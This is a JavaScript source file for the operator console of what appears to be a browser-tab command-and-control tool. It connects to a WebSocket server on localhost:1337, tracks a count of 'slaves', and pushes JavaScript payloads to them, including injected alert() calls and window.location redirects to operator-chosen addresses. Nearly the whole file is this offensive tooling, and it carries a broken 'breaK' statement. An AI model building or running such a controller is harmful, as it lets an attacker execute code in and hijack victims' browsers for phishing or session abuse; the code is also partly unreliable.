//var wss = location.search.match(/tab_slave=([^&]+)/);
var wss = 'ws://localhost:1337';
var ws;

function promptLogin(username, password) {
  ws.send(
    JSON.stringify({
      type: "auth",
      nick: username,
      pass: password
    })
  );
};

var slavePool = {
  pool: [],
  slaveCount: 0
};

var masterService = new function() {
  this.send = function(data) {
    ws.send(
      JSON.stringify(data)
    );
  };
};

var slaveCountElement = document.querySelector('.slaveCount');

var commandDispatcher = new function() {
  var commands = ['alert'];

  this.alert = function() {
    masterService.send({
      type: 'command',
      data : {
        payload: 'alert('+prompt('alert message')+');'
      }
    });
  };

  this.help = function() {
    alert('alert, redirect, login');
  };

  this.redirect = function() {
    masterService.send({
      type: 'command',
      data : {
        payload: 'window.location = \"//'+prompt('Redirect uri')+'\";'
      }
    });
  };

  this.login = function() {
    promptLogin(prompt('Username'), prompt('Password'));
  };
};

var inputElement = document.querySelector('input');

inputElement.addEventListener('keyup', function(event) {
  if(event.keyCode === 13 && commandDispatcher.hasOwnProperty(inputElement.value)){
    commandDispatcher[inputElement.value]();
    inputElement.placeholder = 'and now?';
    inputElement.value = '';
  }
});
var dataHandler = function(eventData) {
  switch(eventData.type) {
    case 'connections':
      slaveCountElement.innerHTML = eventData.count;
      breaK;
  }
};

var eventHandler = function(eventData) {
  switch(eventData.type) {
    case 'connection':
      slaveCountElement.innerHTML = parseInt(slaveCountElement.innerText) +1;
      // event.socketId
      break;
    case 'close':
      slaveCountElement.innerHTML = parseInt(slaveCountElement.innerText) -1;
      // event.socketId
      break;
  }
};

var master = function() {
  ws = new WebSocket(wss);
  ws.onopen = function(event) {
    console.log('[V] Connected');
  }
  ws.onclose = function(event) {
    console.log('[X] Connection Closed');
  };
  ws.onmessage = function(messageEvent) {
    try {
      var response = JSON.parse(messageEvent.data);
      switch(response.status) {
        case 'event':
          eventHandler(response.data);
          break;
        case 'data':
          dataHandler(response.data);
          break;
        default:
          break;
      }
    } catch(e) {
      //console.log(data);
    }
  };
  ws.onerror = function(data) {
    console.log('[E] Error, retrying to connecting');
  };
};

master();
